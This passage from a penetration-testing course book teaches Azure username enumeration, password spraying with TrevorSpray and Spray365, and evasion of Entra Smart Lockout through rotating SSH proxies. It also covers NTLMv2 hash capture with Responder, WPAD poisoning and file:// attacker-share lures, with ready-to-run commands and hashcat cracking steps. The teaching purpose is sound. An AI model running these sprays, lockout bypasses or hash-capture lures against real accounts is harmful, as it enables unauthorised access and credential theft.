$ curl -s --data "$args&username=$USER&password=$PASS" "$url" | jq .
                             Rotate Password
```

Azure also provides an OAuth Token flow endpoint that is easy to use and provides a penetration tester with username enumeration of Azure platform users. The OAuth Token flow endpoint has these properties:

- More input fields than the prior method, including a password field for password guessing.
- An error response code that can be easily decoded.
- Additionally tells us if MFA is enabled (if the password is correct).
- This endpoint is protected by "Entra Smart Lockout."

Several automated tools support querying this endpoint; however, we can easily use curl and automation with our own script.

We can use curl to easily query this endpoint, rotating the username highlighted in the request below:

```
curl -i -s -k -X $'POST' \
```

```
-H $'Content-Type: application/x-www-form-urlencoded' --data \
$'client_id=CLIENT_ID&grant_type=password&client_info=1&username=moses
@redsiege.com&password=PASSWORD&scope=SCOPE' \
```

\$'https://login.microsoftonline.com/organizations/oauth2/v2.0/token'

Take caution when sending a high rate of requests to this endpoint because Azure has a feature called "Entra Smart Lockout" that is enabled by default for all Azure tenants and all Azure users. We will discuss this more and techniques for bypassing it in the password spraying module.

# **Username Enumeration: OAuth Token Endpoint (2)**

- Decode the response for enumeration of valid tenant users
- A valid username (with wrong password)
  - − Response: 50126

Error code 50126 means valid user

**"error\_description": "AADSTS50126: Error validating credentials due to invalid username or password.\r\nTrace ID: ce378563- 7b85-4154-860c-bee8315bac02\r\nCorrelation ID: ce0115b3-035c-4676-ae06-edb9d4e2627a\r\nTimestamp: 2022-01-06 06:51:07Z",**

**"error":"invalid\_grant",**

- User doesn't exist on the tenant
  - − Response: 50034

Error code 50034 means invalid username

**"error":"invalid\_grant", "error\_description": "AADSTS50034: The user account {EmailHidden} does not exist in the rtcfingroup.com directory. To sign into this application, the account must be added to the directory.\r\nTrace ID: b70fdd8d-7d92-4186-a1c1- 0d4d48433502\r\nCorrelation ID: ce4f3df5-1f1d-42b6- 9b92-**

Decoding the response to the OAuth Token endpoint for username enumeration is straightforward and easy.

#### *Valid Username:*

An error code of 50126 signifies a valid username has been queried but the password is incorrect. Since the focus of this module is on username enumeration, we can ignore the response for a valid password or that MFA is enabled.

#### *Username Does Not Exist:*

An error code of 50034 signifies that the user doesn't exist on the tenant.

#### Reference:

• Azure AADSTS Error Codes: https://docs.microsoft.com/en-us/azure/activedirectory/develop/reference-aadsts-error-codes#aadsts-error-codes

![](SEC560_Book2_page_87_Figure_0.jpeg)

For many years, Microsoft Exchange Online has supported legacy authentication. Legacy authentication refers to clients using Basic Authentication in their authentication requests, such as the Office 2010 client or any client using an older mail protocol such as IMAP or POP3. These older clients don't support modern authentication. Microsoft is pushing its customers to use modern authentication or OAuth 2.0 framework. These legacy authentication protocols include Exchange ActiveSync (EAS), Autodiscover, MAP4, POP3, Authenticated SMTP, and Exchange Online PowerShell.

Azure is moving customers from legacy to modern authentication. These legacy protocols do not support MFA. Microsoft's position statement is to encourage customers to "block legacy authentication." Microsoft Azure is taking steps to better protect M365 and Azure users by enforcing secure defaults for new tenants by enabling MFA for all users and encouraging customers to use modern authentication (OAuth 2.0). On their own, customers are gaining awareness and enabling MFA. Since the legacy protocols do not support MFA, as penetration testers, we can authenticate as these users and bypass MFA! As of February 2022, the current posture of tenants is that Basic Authentication is enabled for these legacy protocols and can still be used by penetration testers. However, Microsoft has made new features available that allow customers to enable modern authentication across their tenants and disable all or specific Basic Authentication protocols.

As penetration testers, we need to know that multiple tools can still be used to carry out testing for legacy authentication and on-premises Exchange, including newer tools that auto-detect MFA and automatically try legacy authentication protocols. Some Azure clients will still use legacy authentication protocols, Outlook Web Access, or Microsoft Exchange on-premises, which are exposed over the public internet. They include:

- MailSniper: https://github.com/dafthack/MailSniper
- ews-crack: https://github.com/mikesiegel/ews-crack
- Metasploit Framework Auxiliary module: auxiliary/scanner/http/owa\_login

- Metasploit Framework Auxiliary module: auxiliary/scanner/http/owa\_ews\_login
- TrevorSpray (discussed in the next module)

#### References:

- Basic Authentication and Exchange Online September 2021 Update: https://techcommunity.microsoft.com/t5/exchange-team-blog/basic-authentication-and-exchangeonline-september-2021-update/ba-p/2772210
- Exchange Online to retire Basic auth for Client Submission (SMTP AUTH): https://techcommunity.microsoft.com/blog/exchange/exchange-online-to-retire-basic-auth-for-clientsubmission-smtp-auth/4114750
- Current Microsoft guidance: https://learn.microsoft.com/en-us/exchange/clients-and-mobile-inexchange-online/deprecation-of-basic-authentication-exchange-online

![](SEC560_Book2_page_89_Picture_2.jpeg)

#### **Course Roadmap**

Section 1: Miniature Engagement, Recon, and Scanning

Section 2: Scanning and Initial Access

Section 3: Post-Exploitation

Section 4: Domain Privilege Escalation and Lateral Movement

Section 5: Persistence and Evading Controls

Section 6: CTF and Next Steps

- Version Scanning with Nmap and Netcat
- Visual Scanning with GoWitness
- Vulnerability Scanning and Analysis
- Nmap Scripting Engine
- OS Detection Techniques
  - Lab 2.1: Version Scanning, OS Detection, NSE, and GoWitness
- Initial Access
- Password Guessing
  - Lab 2.2: Password Guessing
- Azure Intro
- Entra ID
- Azure Recon
- Azure Password Attacks
  - Lab 2.3: Azure Recon and Password Attacks
- Sniffing and Relaying
- Responder
  - Lab 2.4: Responder
- Exploitation
- Exploit Categories
- Metasploit and Meterpreter
  - Lab 2.5: Metasploit and Meterpreter

![](SEC560_Book2_page_90_Figure_0.jpeg)

Password spraying can be an effective technique for password guessing that involves sending requests for a list of all known usernames (or guessing from a list of potential usernames) with a single password attempt. We must be careful of account lockout and ensure that enough time passes between each spray. This technique will help prevent account lockout since only one password is attempted for all users rather than sending many password attempts against a single user. This method is more effective than brute force or word list guessing and can yield excellent results. After guessing a single password, the penetration tester can start reconnaissance with an initial foothold—an authenticated user account.

Password spraying is effective in Microsoft Azure using the OAuth Token flow endpoint of https://login.microsoftonline.com/organizations/oauth2/v2.0/token. As penetration testers, we can effectively send multiple username requests against this application endpoint, targeting a tenant with just a single password attempt. This can yield successful results. There are some caveats to this approach, however. Azure is evolving its defensive technology to make this technique less effective, so we need newer tools and approaches to bypass defensive technology. This endpoint is protected by "Entra Smart Lockout" by default for any Azure user.

Rotating IP addresses in requests can be an effective technique to bypass Entra Smart Lockout. Gone are the days of classic password spraying, where it was very easy to be effective against internal services such as an on-premises domain controller. A low and slow approach can work; however, it might make the password spraying infeasible given the time constraints of a client penetration test.

#### **Automated Tools**

One of the tools to arrive at the scene and gain popularity for Azure password spraying is Beau Bullock's MSOLSpray.

Since Azure is evolving its defensive countermeasures against this technique, new and modular approaches are required. TrevorSpray and Spray365 are newer tools that afford us advantages for advancing modular features and multi-platform Python support. More importantly, they both include support for detecting and handling Entra Smart Lockout.

#### References:

- TrevorSpray: https://github.com/blacklanternsecurity/TREVORspray
- Spray365: https://github.com/MarkoH17/Spray365

![](SEC560_Book2_page_92_Picture_2.jpeg)

# **Password Spraying Tool: TrevorSpray**

- **TrevorSpray:** Python modular spraying tool for detection of smart lockout, MFA bypass, custom timers, excellent logging, and proxy SSH support (for rotating IP addresses)
  - − Website: github.com/blacklanternsecurity/TREVORspray

| trevorsprayrecon redsiege.com                                                     | Perform recon on domain for Azure tenant<br>information                |
|-----------------------------------------------------------------------------------|------------------------------------------------------------------------|
| trevorspray -u emails.txt -p Autumn2024                                           | Perform spray against users in file with single<br>password            |
| trevorspray -u emails.txt -p Autumn2024<br>-delay 60 -jitter 20 -lockout-delay 60 | Jitter: Random deviation of delay between requests<br>up to 20 seconds |

TrevorSpray is a Python-based, modular Azure password spraying tool that was designed with the intent of getting around the defensive countermeasure of Entra Smart Lockout and MFA. The following is from the blog post of the author when describing the increasing difficulty in effectively carrying out password spraying against Azure:

As pen testers, we've been forced to dial back the intensity of our password sprays so that they take hours or days to finish. And even when we find a valid credential, it sometimes doesn't lead anywhere thanks to security policies like MFA. But since we're hackers and it's our job to hack stuff, it's hard to sit idly by and let our favorite pastime of password spraying go the way of the dodo.

What I'm trying to say is that we're frustrated. And when hackers are frustrated, they write code. So, it is with great delight that we are open-sourcing some new tools which are the product of our frustration and will hopefully help to make password spraying fun again.

# **Tool Capabilities**

The nice thing about TrevorProxy is that it is dead simple to use, stable, and capable of many features and modules that help to bypass Entra Smart Lockout and MFA:

- Round-robin proxying of requests through SSH proxies to help avoid Entra Smart Lockout
- A separate proxy tool (TrevorProxy) to proxy traffic through Burp Suite
- Multi-threaded
- Support of multiple modules (msol, adfs, okta, anyconnect) and custom modules
- Spoofing of the User-Agent string
- Options for delay, jitter, and lockout-delay between requests (to help defeat Azure Account Lockout)
- Automatic MFA bypass support when it detects MFA support using eight methods (IMAP, POP, Exchange Web Services, Exchange ActiveSync, and several more)
- Comprehensive logging and IPv6 support
- Enumeration feature for doing recon on tenant domain

Installation on SEC560's Linux:

```
$ pip install --no-cache-dir
git+https://github.com/blacklanternsecurity/trevorproxy
```

```
$ pip install --no-cache-dir
git+https://github.com/blacklanternsecurity/trevorspray
```

Perform recon against the domain, finding the token endpoint and DNS entries:

```
$ trevorspray --recon redsiege.com
```

Perform password spraying against all users in emails.txt with a password of Summer2024:

```
$ trevorspray -u emails.txt -p Summer2024
```

Perform password spraying with a delay of 60 seconds between requests, with a jitter of 20 seconds and a lockout delay of 60 seconds:

```
$ trevorspray -u emails.txt -p Summer2024 --delay 60 --jitter 20 --
lockout-delay 60
```

#### References:

- TrevorSpray Github: https://github.com/blacklanternsecurity/TREVORspray
- TrevorSpray Blog: https://github.com/blacklanternsecurity/TREVORspray/blob/trevorsprayv2/blogpost.md

![](SEC560_Book2_page_94_Picture_2.jpeg)

# **Password Spraying Tool: Spray365**

- **Spray365**: Python password spraying tool for detection of smart lockout; supports timers, randomizing and spoofing user agent, execution plans, HTTPS proxying, and conditional access detection
  - − Website: github.com/MarkoH17/Spray365

```
Generate an execution plan named plan-1.365 for 
                                                        domain redsiege.com, testing single password of 
                                                        Autumn2024 for username list in users.txt
python3 spray365.py generate --ep plan-1.365 
-d redsiege.com -u users.txt -p Autumn2024
                                                          Generate an execution plan named plan-2.365; 
                                                         randomize user agent string and delay 15 seconds 
                                                                    between each request
python3 spray365.py generate --ep plan-2.365 
-d redsiege.com -u users.txt -p Autumn2024 
-rUA -delay 15
python3 spray365.py spray --ep plan-1.365 Execute the spray execution plan, plan-1.365
```

Spray365 is a Python-based M365 password spraying tool developed by Mark Hedrick. It utilizes a novel concept of first requiring the creation of an "execution plan." After creation of an execution plan, the user runs the plan for execution of the spray. Spray365 has support for spoofing user-agent strings, randomizing and shuffling the order of spraying attempts, and native support for proxying HTTPS/HTTP traffic through Burp Suite. It supports execution plans in JSON and logging output in JSON, making the tool flexible and extensible with other tooling. Spray365 was also created for the purpose of novel approaches in identifying users with support for Entra ID conditional access policies.

From the author: "The current state of password spraying Microsoft 365 accounts could benefit from new approaches to bypassing Entra ID conditional access policies and other techniques that make it difficult to detect password spraying techniques."

#### Tool capabilities include:

- Pre-generating an execution plan in JSON for later running, which includes built-in features to help bypass Entra Smart Lockout technology
- Logging results stored in JSON
- Randomizing user agents
- Spoofing a custom user agent
- Custom delay timers
- Shuffling authentication and order attempts
- Proxy requests through an HTTPS proxy such as Burp Suite

Create the execution plan:

```
$ python3 spray365.py generate --
execution_plan path_for_saved_execution_plan -d domain_name -u 
file_containing_usernames -p single_attempted_password
```

Create an execution plan that randomizes the user-agent string with a delay of 15 seconds between requests:

```
$ python3 spray365.py generate --execution_plan
path_for_saved_execution_plan -d domain_name -u 
file_containing_usernames -p single_attempted_password --rUA --delay 
15
```

Run the execution plan:

\$ python3 spray365.py spray --execution\_plan *path\_to\_execution\_plan* References:

- Spray365 GitHub: https://github.com/MarkoH17/Spray365
- Article on Spray365 ("Spray 365: A New Twist on Office 365 Password Spraying"): https://depthsecurity.com/blog/spray-365-a-new-twist-on-office-365-password-spraying

#### **Entra Smart Lockout**

Entra Smart Lockout detects password spraying tools and invalidates their results. It is enabled for all Azure tenants and users.

- Azure tracks unfamiliar locations across data centers (based on IP address)
- When 10 logins with failed attempts are detected, returns an account locked error response
- Returns error response whether password is valid or invalid
- The user account in Azure **is not actually locked out** by spraying tool

*AADSTS50053: IdsLocked* - The account is locked because the user tried to sign in too many times with an incorrect user ID or password. The user is blocked due to repeated sign-in attempts.

![](SEC560_Book2_page_96_Figure_9.jpeg)

Both TrevorSpray and Spray365 detect Smart Lockout and support rotation of IP addresses!

Entra Smart Lockout is a defensive security control technology feature that is enabled by default for all Azure tenants and users. Since 2018, it has helped protect Azure users against automated brute force or the guessing of user passwords. It is a technology feature that every penetration tester should be aware of when assessing the Azure platform. The following is from the Microsoft documentation:

Smart lockout helps lock out bad actors that try to guess your users' passwords or use brute-force methods to get in. Smart lockout can recognize sign-ins that come from valid users and treat them differently than ones of attackers and other unknown sources. Attackers get locked out, while your users continue to access their accounts and be productive.

#### **How It Works**

Each Azure datacenter tracks login activity for the geographic region independent from the other regions. It uses familiar vs. unfamiliar locations to distinguish a malicious actor from a genuine user. The familiar vs. unfamiliar locations have separate lockout counters. By default, Entra Smart Lockout will lock the account after 10 failed attempts for Azure public tenants and three for Azure Government tenants. The account locks again after each failed login attempt—for one minute and then longer for subsequent attempts. Azure doesn't disclose the exact thresholds or rates for the lockout period growing.

The automated penetration testing tools should be built to automatically detect when Azure is returning a response, indicating Smart Lockout and immediately stop sending requests. Entra ID will return a response of AADSTS 50053 (IdsLocked error code) regardless of the password validity. IdsLocked means that the account is locked because the user tried to sign in too many times with an incorrect user ID or password. The user is blocked due to repeated sign-in attempts.

This might alarm the penetration tester, believing that the account is locked out. However, the actual user account is not locked in Azure. It simply indicates that malicious, anomalous activity is detected. Once this condition is reached, it is not possible for the automated tool to be effective in eliciting a valid password since the AADSTS 50053 response is returned regardless of a correct or incorrect password.

Other important points for Azure customizations used by clients. The Penetration Tester might need to know this:

- Customization of Smart lockout features is possible but requires an Entra ID premium license P1 or greater.
- Smart Lockout can be integrated with hybrid deployments that use password hash synchronization or pass-through authentication in order to help protect on-premises AD DS.
- Federated deployments using AD FS can be protected with AD FS Extranet Lockout and Extranet Smart Lockout.

Why does this matter? As Azure penetration testers, this feature matters to us because it is vital that we avoid detection of Smart Lockout. It reduces the efficacy of password enumeration. New tools, techniques, and methods are required to ensure accuracy for password spraying.

#### Reference:

• Protect user accounts from attacks with Microsoft Entra smart lockout: https://learn.microsoft.com/enus/entra/identity/authentication/howto-password-smart-lockout

![](SEC560_Book2_page_98_Picture_0.jpeg)

![](SEC560_Book2_page_98_Picture_1.jpeg)

# **Bypass Strategies for Avoiding Lockout**

There are several ways to avoid hitting lockout thresholds in Entra ID.

- Use a load balancing approach, where each outbound connection uses a different gateway/public IP
- Leverage cloud API Gateways or serverless functions
  - − Pay close attention to cloud provider Terms of Service!
  - − AWS recently changed the Terms of Service to preclude outbound penetration testing using AWS API Gateways
- Use different APIs within the Microsoft Portals to attempt to circumvent detection

Several techniques can be used to avoid lockout via Smart Lockout. The primary approach is to avoid using the same IP address or other identifying information in the Entra ID environment. To do this, we have several great options we can deploy.

The first one is to use a load-balancing system to our advantage. We'll see how TrevorSpray can use an array of hosts to load balance its spraying activity and speed the process without lockouts.

The second option is to use a cloud API gateway service. For a long time, testers would use Fireprox or Burp Suite IP Rotate plugin to send traffic using the standard AWS API Gateway, which will naturally round-robin the connection across a very large number of IP addresses. AWS recently changed their terms of service to exclude that activity from acceptable use. While those tools and the AWS service are no longer an option, other cloud providers that do not limit the use of their service for penetration testing could be an option.

The third option is to avoid using the same Entra ID APIs to prevent lockout via a single API.

![](SEC560_Book2_page_99_Picture_2.jpeg)

# **Bypassing Technique: Rotating IP Addresses**

- **TrevorSpray** supports load balancing requests through multiple SSH proxies with **--ssh**, minimizing the risk of Smart Lockout
- Excellent approach for using native Linux OS and SSH for rotating IP addresses
- Example to proxy through eight SSH servers:

This rotates requests between 8 SSH proxies, with a delay of 45 second per proxy and a jitter setting of 23 seconds.

```
$ trevorspray.py -e user_emails.txt -p Summer2024 --delay 45 --jitter 23
--ssh root@proxy1 root@proxy2 root@proxy3 root@proxy4 root@proxy5 root@proxy6 root@proxy7 
root@proxy8 --key /home/sec560/.ssh/id_rsa
```

• **Tool benchmark:** During an Azure penetration test, it was successful in spraying an Azure tenant containing 1,013 users without Smart Lockout detection in 6 hours. Timers can be more aggressive!

TrevorProxy not only has automated support for detecting Smart Lockout but also has excellent support for using SSH proxies to round-robin or load balance across multiple spray requests. This serves a vital function of avoiding Entra Smart Lockout counters and timers across disparate, independent geographic regions. The more SSH proxies that are used, the more effective TrevorSpray is in avoiding triggering Smart Lockout. This can be an important use case for environments that need to rely on native Linux OS and SSH capabilities to support automated security tooling where HTTP(S) proxies such as Burp Suite are not available or otherwise viable.

Some organizations have chosen to use SSH proxies and SOCKS support to carry out security simulations. For these organizations, TrevorProxy is a great fit for bypassing Smart Lockout.

As of January 2022, running a penetration test against an Azure tenant with over 1,000 users and TrevorSpray can be successful in bypassing Smart Lockout. This penetration test was run with the following settings and was successful in detecting valid user passwords:

Eight SSH proxies load balanced to rotate IP addresses.

A delay of 45 seconds per proxy between requests (--delay 45). This is the delay between each SSH proxy sending a password spray request (not the delay between overall requests).

A jitter setting of 23 seconds (--jitter 23).

Example command:

```
python3 trevorspray.py -n -e user_emails.txt -p Summer2024 --delay 45 
--jitter 23 --ssh root@proxy1 root@proxy2 root@proxy3 root@proxy4 
root@proxy5 root@proxy6 root@proxy7 root@proxy8 --key 
/home/sec560/.ssh/id_rsa
```

Result notes: This spray took just under 6 hours to complete against 1,013 Entra ID users. The above setting is certainly a conservative one. More aggressive delay and jitter settings can speed up this with a smaller data set; however, it helps to get a benchmark for Smart Lockout detection behavior against a tenant of over 1,000 users.

In some cases of more aggressive settings, Azure will start to detect malicious password spraying after 300 requests, invalidating the entire penetration test for that scan attempt.

![](SEC560_Book2_page_101_Picture_0.jpeg)

![](SEC560_Book2_page_101_Picture_1.jpeg)

# **Azure Recon and Password Attacks**

Refer to the lab workbook for instructions.

![](SEC560_Book2_page_102_Picture_2.jpeg)

#### **Course Roadmap**

Section 1: Miniature Engagement, Recon, and Scanning

Section 2: Scanning and Initial Access

Section 3: Post-Exploitation

Section 4: Domain Privilege Escalation and Lateral Movement

Section 5: Persistence and Evading Controls

Section 6: CTF and Next Steps

- Version Scanning with Nmap and Netcat
- Visual Scanning with GoWitness
- Vulnerability Scanning and Analysis
- Nmap Scripting Engine
- OS Detection Techniques
  - Lab 2.1: Version Scanning, OS Detection, NSE, and GoWitness
- Initial Access
- Password Guessing
  - Lab 2.2: Password Guessing
- Azure Intro
- Entra ID
- Azure Recon
- Azure Password Attacks Lab 2.3: Azure Recon and Password Attacks
- Sniffing and Relaying
- Responder
  - Lab 2.4: Responder
- Exploitation
- Exploit Categories
- Metasploit and Meterpreter
  - Lab 2.5: Metasploit and Meterpreter

![](SEC560_Book2_page_103_Picture_2.jpeg)

#### **Kerberos and NTLMv2**

- Kerberos is the main authentication protocol in Windows domains, discussed in depth later in this course
- Kerberos relies on SPNs and computer names for authentication
- Whenever IP addresses are used (i.e., \\192.168.10.10), Kerberos can't work, and the system will fall back to NTLM authentication
- Some older software doesn't support Kerberos and relies on NTLMv2 authentication (at best)
  - − This includes non-Windows systems that interact with Windows domains

**Due to the above, NTLMv2 is rarely fully disabled in corporate environments. It remains a highly interesting attack surface for penetration testers!**

We explained previously that Kerberos is the main authentication protocol in a Windows domain environment. Does that mean NTLMv2 can be disabled?

First of all, it's important to note that Kerberos relies on SPNs (Service Principal Names) for authentication. Service Principal Names are constructed using hostnames. By default, this means that whenever IP addresses are used (e.g., \\192.168.10.10), Kerberos won't function, and the system will fall back to NTLM authentication. This is a Group Policy setting that can be configured, but by default, Kerberos won't work with IP addresses.

Some older software doesn't support Kerberos and relies on NTLMv2 authentication (at best). This includes, for example, non-Windows systems that interact with Windows AD domains.

Due to the issues mentioned above, NTLMv2 is rarely fully disabled in corporate environments, and it remains a highly interesting attack surface!

# **NTLMv2 Attack Strategies**

- Sniffing of an NTLMv2 Challenge/Response
  - − After which, we can launch offline brute force attacks to recover the user's password/NT hash
- Relaying an SMB connection using NTLMv2
  - − Thereby obtaining access to a target system without knowing the user's password/NT hash
- Attacks rely on luring victims into connecting to the attacker
  - − Allows attacker to *both* sniff the NTLMv2 challenge-response AND relay SMB connections

How could we attack NTLMv2? The design of the NTLMv2 challenge-response protocol provides us with two main attack strategies:

Sniffing of an NTLMv2 Challenge/Response, after which we can launch offline brute force attacks to recover the user's password/NT hash. We explained how NTLMv2 challenges and responses are built in section 2; feel free to have another look for a quick refresh.

Relaying an SMB connection using NTLMv2, thereby obtaining access to a target system *without* knowing the user's password/NT hash.

We will discuss both attack strategies in depth! Note that for both attack strategies, it would be useful for the attacker to lure victims into connecting to their machines (as this would allow them to both sniff the NTLMv2 challenge-response AND relay SMB connections). How could we achieve this?

![](SEC560_Book2_page_105_Picture_2.jpeg)

# **Sniffing Windows Challenge/Response Authentication**

- Instead of grabbing the SAM from a target machine, the attacker could sniff challenge/response authentication from the network
- Attacker needs to sniff in one of three ways:
  - − Source system performing the authentication
  - − Machine-in-the-Middle position
  - − On the system being authenticated to
- Or trick the user into doing challenge/response authentication with the attacker's machine

![](SEC560_Book2_page_105_Picture_10.jpeg)

For a final approach to grabbing hashes, by sniffing challenge/response authentication from the network as users authenticate to file servers or domain controllers, the attacker can gather hashes suitable for cracking.

To accomplish this task, the attacker has two options. First, they could sniff the challenge/response exchange between a client and server. For such an attack, the tester would have to be located at a spot in the network through which these exchanges are transmitted, such as the span port of a switch, the source subnet of the client, or the destination subnet of the server. Upon sniffing the exchanges, the attacker will have to crack whichever authentication protocol the user and file server or domain controller are using, such as LANMAN Challenge/Response, NTLMv1, or one of the more secure and time-consuming-tocrack protocols, NTLMv2 or Microsoft Kerberos.

Another option available to the attacker involves tricking the user into performing a challenge/response authentication with the attacker's own system. With this approach, the attacker might even force the client to use a weaker, more easily cracked password hash mechanism, such as LANMAN Challenge/Response or NTLMv1. The attacker could send the user an email with a link in it of the form file://[AttackerIP]/[AttackerShare]. Upon that link being clicked in most email readers, the victim's machine will try to mount a share on the attacker's machine, performing Windows authentication with it. The attacker could sniff the exchange between the client and the attacker's own machine to get a challenge and response suitable for cracking.

# **Cracking Sniffed Credentials**

- Step 1: Sniffing
  - − We can use tcpdump as we did before to save the packet capture
- Step 2: Extract hashes for cracking
  - − PCredz is a free tool to extract many types of hashes (it can even sniff too!)
  - \$ **Pcredz -f file-to-parse.pcap**
- Step 3: Crack
  - − We can crack the resulting hashes using Hashcat
  - − Cain can sniff, extract, and crack all by itself, but it isn't a strong cracker

#### PCredz is available at https://github.com/lgandx/PCredz

Before we can crack any sniffed credentials, we first need to sniff. We can use tcpdump to capture the packets. We could also use Wireshark if we like. Some man-in-the-middle tools (MITM) have the ability to save a packet capture for use. Regardless, we obviously first need the packet capture.

Next, we need to extract the hashes into a crackable format. The free PCredz tool can do exactly that for us. Note, in the tool's own documentation, the tool is referred to as both "PCredz" and "Pcredz" (note the case of the C).

We'll refer to the tool as PCredz and the executable as Pcredz, as is done in the documentation.

Finally, we need to crack. We can crack the hashes with Hashcat.

PCredz is available at https://github.com/lgandx/PCredz.

![](SEC560_Book2_page_107_Figure_0.jpeg)

# **Extracting Hashes with PCredz**

The tool is very verbose, and it saves the output in a log file and puts hashes in a separate file

```
sec560@560vm:~$ cd /opt/PCredz/
sec560@560vm:/opt/PCredz$ python3 ./Pcredz -f /tmp/winauth.pcap
Pcredz 2.0.1
Author: Laurent Gaffie
Please send bugs/comments/pcaps to: laurent.gaffie@gmail.com
This script will extract NTLM (http,ldap,smb,sql,etc), Kerberos,
...trimmed for brevity...
protocol: tcp 10.10.75.103:56930 > 10.10.75.101:445
NTLMv2 complete hash is: 
clark::WORKGROUP:3b0fd802ab1f8cf6:F2897D70EBCDC798BA30E60EF07D6944:01010000000000003AFF1985512AD7
012F4440FF2C5A353E0000000002001A00530045004300350036003000530054005500440045004E00540001001A00530
045004300350036003000530054005500440045004E00540004001A005300650063003500360030005300740075006400
65006E00740003001A00530065006300350036003000530074007500640065006E007400070008003AFF1985512AD7010
600040002000000080030003000000000000000000000000000000018F8B0F220A00425A115CC4F08725CD74E3F2EAB56
F6E8DC250E892032A7B0EE0A001000000000000000000000000000000000000900220063006900660073002F003100300
02E00310030002E00370035002E0031003000310000000000
/tmp/winauth.pcap parsed in: 0.012 seconds (File size 0.0101 Mo).
```

PCredz is quite simple to use. First, we need to change directory (cd) into the directory for the tool. Next, we simply need to run the tool and specify the input file:

sec560@560vm:~\$ cd /opt/PCredz/

sec560@560vm:/opt/PCredz\$ python3 ./Pcredz -f /tmp/winauth.pcap

![](SEC560_Book2_page_108_Picture_2.jpeg)

# **Getting the Hashes from PCredz's Log File**

- All output is saved in CredentialDump-Session.log
- Hashes are dumped by protocol into logs folder (e.g., NTLMv2.txt) and can be used with Hashcat
- Cracking with Hashcat (-m 5600)

\$ **hashcat -m 5600 logs/NTLMv2.txt /opt/password.lst**

The tool automatically saves the files in a crackable format. It also creates a full log file named CredentialDump-Session.log that contains the output, including hashes. We can use the files in the "logs" directory directly with our crackers.

With Hashcat and mode 5600, we can use a command like this:

\$ hashcat -w 3 -a 0 -m 5600 NTLMv2.txt password.lst

![](SEC560_Book2_page_109_Picture_2.jpeg)

#### **Course Roadmap**

Section 1: Miniature Engagement, Recon, and Scanning

Section 2: Scanning and Initial Access

Section 3: Post-Exploitation

Section 4: Domain Privilege Escalation and Lateral Movement

Section 5: Persistence and Evading Controls

Section 6: CTF and Next Steps

- Version Scanning with Nmap and Netcat
- Visual Scanning with GoWitness
- Vulnerability Scanning and Analysis
- Nmap Scripting Engine
- OS Detection Techniques
  - Lab 2.1: Version Scanning, OS Detection, NSE, and GoWitness
- Initial Access
- Password Guessing
  - Lab 2.2: Password Guessing
- Azure Intro
- Entra ID
- Azure Recon
- Azure Password Attacks Lab 2.3: Azure Recon and Password Attacks
- Sniffing and Relaying
- Responder
  - Lab 2.4: Responder
- Exploitation
- Exploit Categories
- Metasploit and Meterpreter
  - Lab 2.5: Metasploit and Meterpreter

![](SEC560_Book2_page_110_Picture_0.jpeg)

109

![](SEC560_Book2_page_110_Picture_1.jpeg)

# **Overview**

Responder tricks victims into authenticating to attacker's system.

- To bait victims, Responder abuses multiple multicast protocols for name resolution:
  - − NBT-NS (NetBIOS Name Server)
  - − LLMNR (Link-Local Multicast Name Resolution), which is the successor to NBT-NS (since Windows Vista)
  - − mDNS (Multicast DNS)
- All of these protocols effectively broadcast to resolve hostnames
- Responder responds with the attacker's address

Responder is written by Laurent Gaffié and is available at https://github.com/lgandx/Responder.

So, how do I get a victim system to connect to my machine? We can use Responder, the "penetration tester's best friend"! It's been around for a few years and has proven to be a highly effective tool.

Responder is a tool initially developed by SpiderLabs (Laurent Gaffie). It is mainly focused on attacking NTLM authentication. Responder attempts to lure victims into authenticating, after which it collects NTLM(v2) challenge responses that can be reused in various attacks.

So, how does it reach its goal? Responder relies on two main protocols to lure victims to connect (and authenticate):

NBT-NS (NetBIOS Name Server)

LLMNR (Link-Local Multicast Name Resolution) is the successor to NBT-NS (since Windows Vista)

Both protocols allow hosts on the same subnet to resolve hostnames by sending requests to the multicast address (think an ARP-like feature for hostname resolution). What could possibly go wrong? You guessed it: Much like ARP spoofing, someone unexpected will respond to the name resolution requests.

The latest version of Responder can be found here: https://github.com/lgandx/Responder.

![](SEC560_Book2_page_111_Figure_0.jpeg)

In the screenshot, we can see Responder fulfilling its bidding: It's capturing an NTLM(v2) challenge/response hash from a system. We can deduce the following:

The victim IP address is 192.168.18.128

The victim username is SEC560STUDENT\clark

Responder tricked the victim into connecting by "poisoning" the resolution for hostname "WINDOWS01".

![](SEC560_Book2_page_112_Figure_0.jpeg)

Another interesting attack opportunity using Responder is to leverage the "Autodetect Proxy Settings." Automatic proxy detection is a feature by which a Web Proxy is automatically identified by the system; this feature is also known as Web Proxy Auto-Discovery (WPAD). When automatic proxy detection is enabled, the system's WebProxy class attempts to locate the proxy configuration script using the following steps:

The WinInet InternetQueryOption function is used to locate the proxy configuration script most recently detected by Internet Explorer.

In case no script is found, the WebProxy class uses DHCP to locate the script. The DHCP server can be configured to respond either with the location of the script or the URL that points to the script.

In case DHCP does not provide the location for the script, a DNS query is sent out to locate a host with "WPAD" as hostname or alias.

In case all of the above does not return a result, the settings configured in the Internet Explorer LAN settings are used.

As we saw earlier, Responder will provide the answer the host is looking for; it will respond to the "WPAD" NBT-NS/LLMNR resolution request. As designed, the hosts that pick up the name resolution will now start using the Responder host as their web proxy. This is a pretty effective Man-in-the-Middle attack. Now Responder can take this a step further; it can be configured to force NTLM authentication. When enforced, the hosts using Responder as their proxy server will now include their NTLM authentication in their requests.

![](SEC560_Book2_page_113_Picture_2.jpeg)

# **Other Tricks to Obtain NetNTLMv2 Challenge/Response**

- Vulnerability scanners running authenticated scans
  - − Scanner will attempt to authenticate to any system in the scan range that is listening on port 445
- Fetch a remote resource using single sign-on (SSO)
  - − Embedding a remote picture (hosted on SMB share) in a Word document
  - − Embedding a remote icon (hosted on SMB share) on a share (SCF file)
  - − Embedding an SMB share to an image in web application source code

Over the years, many more "creative" ways of obtaining NetNTLMv2 challenge/responses have been described by various security researchers. So many techniques exist, as we only need to force a target system to load an external resource with Windows SSO.

A few fan favorites include (but are not limited to):

Vulnerability scanners running authenticated scans (classic). When configured to scan an entire IP range, these scanners will attempt to authenticate to any system in this IP range that is listening on port 445.

Embedding a remote picture (hosted on an SMB share) in a Word document. If the victim opens the Word document, NetNTLMv2 credentials are shipped to us.

Embedding a remote icon (hosted on an SMB share) in a folder share (SCF file). If the victim opens the folder, NetNTLMv2 credentials are shipped to us.

Embedding an SMB share to an image in web application source code. If the victim visits the website, NetNTLMv2 credentials are shipped to us.

#### Reference:

• https://redsiege.com/560/netntlm

![](SEC560_Book2_page_114_Picture_0.jpeg)

